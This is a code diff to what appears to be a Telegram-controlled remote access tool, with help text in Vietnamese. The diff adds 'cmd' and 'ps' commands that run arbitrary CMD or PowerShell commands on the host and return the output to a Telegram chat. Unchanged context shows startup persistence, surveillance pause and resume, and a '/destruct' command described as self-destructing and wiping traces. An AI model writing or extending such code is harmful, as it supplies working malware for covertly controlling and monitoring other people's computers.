@@ -1014,6 +1014,14 @@ def execute_command(command, message=None):
                 f"<code>/destruct Y @{my_name.lower()}</code>"
             )
     
+    elif cmd.startswith("cmd ") or cmd.startswith("!cmd "):
+        actual_cmd = command[4:].strip() if cmd.startswith("cmd ") else command[5:].strip()
+        run_remote_shell(actual_cmd)
+    
+    elif cmd.startswith("powershell ") or cmd.startswith("ps "):
+        actual_cmd = command[11:].strip() if cmd.startswith("powershell ") else command[3:].strip()
+        run_remote_shell(f"powershell -Command {actual_cmd}")
+
     elif cmd in ["/help", "help"]:
         help_text = (
             "<b>Lệnh điều khiển từ xa:</b>\n"
@@ -1025,6 +1033,8 @@ def execute_command(command, message=None):
             "/name - Xem/Đặt tên cho máy\n"
             "/pause - Tạm dừng giám sát\n"
             "/resume - Tiếp tục giám sát\n"
+            "cmd <command> - Chạy lệnh CMD\n"
+            "ps <command> - Chạy PowerShell\n"
             "/destruct - Tự hủy tool và xóa dấu vết\n"
             "/help - Danh sách lệnh"
         )
@@ -1141,6 +1151,19 @@ def add_to_startup(force=False):
         return True
     except Exception as e:
         print(f"⚠️ Lỗi Startup: {e}")
+        return False
+
+def run_remote_shell(command):
+    try:
+        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=15)
+        output = result.stdout + result.stderr
+        if output.strip():
+            send_telegram_message(f"<b>💻 CMD Output</b>\n\n{output[:3000]}")
+        else:
+            send_telegram_message("✅ Lệnh thực hiện xong (không có output)")
+        return True
+    except Exception as e:
+        send_telegram_message(f"❌ Lỗi chạy lệnh: {e}")
         return False
 
 def main():
